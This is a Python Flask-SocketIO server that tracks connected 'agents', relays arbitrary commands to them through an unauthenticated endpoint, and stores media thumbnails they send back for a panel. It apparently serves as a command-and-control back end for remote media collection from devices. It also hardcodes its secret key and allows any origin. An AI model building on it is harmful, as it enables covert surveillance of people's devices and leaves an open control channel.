# main.py (Versión 7.0 - Solo Medios, Arquitectura Legado)
import eventlet
eventlet.monkey_patch()

import os
from flask import Flask, jsonify, request
from flask_socketio import SocketIO
from flask_cors import CORS
import json
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret-key-for-media-app'
CORS(app)
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

media_storage = {}
connected_agents = {}

def log_info(message):
    print(f"[INFO] {time.strftime('%H:%M:%S')} - {message}")

@app.route('/')
def index():
    return "Servidor de Agentes de Medios v7.0"

@app.route('/api/get-agents', methods=['GET'])
def get_agents():
    return jsonify(list(connected_agents.values()))

@app.route('/api/send-command', methods=['POST'])
def send_command():
    data = request.json
    target_id = data.get('target_id')
    action = data.get('action')
    
    if action == 'get_thumbnails' and target_id in media_storage:
        media_storage.pop(target_id, None)

    if not target_id or target_id not in connected_agents:
        return jsonify({"status": "error", "message": "Agente no conectado"}), 404

    command_to_send = {'command': action.upper()}
    socketio.send(json.dumps(command_to_send), to=target_id)
    log_info(f"Comando '{action}' enviado a {target_id[:8]}")
    return jsonify({"status": "success"})

@app.route('/api/get_media_list/<agent_id>', methods=['GET'])
def get_media_list(agent_id):
    log_info(f"Panel pide medios de {agent_id[:8]}")
    media_list = media_storage.get(agent_id, [])
    log_info(f"Enviando {len(media_list)} elementos.")
    return jsonify(media_list)

@socketio.on('connect')
def on_connect():
    sid = request.sid
    device_name = request.args.get('deviceName', 'Desconocido')
    connected_agents[sid] = {'id': sid, 'name': device_name}
    log_info(f"AGENTE CONECTADO: '{device_name}' (ID: {sid})")

@socketio.on('disconnect')
def on_disconnect():
    sid = request.sid
    if sid in connected_agents:
        log_info(f"AGENTE DESCONECTADO: '{connected_agents[sid].get('name')}'")
        connected_agents.pop(sid)
        media_storage.pop(sid, None)

@socketio.on('agent_response')
def on_agent_response(data):
    sid = request.sid
    if sid not in connected_agents: return
    
    if data.get('event') == 'thumbnails_data':
        payload = data.get('data', [])
        media_storage[sid] = payload
        log_info(f"Almacenados {len(payload)} elementos de {sid[:8]}")

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
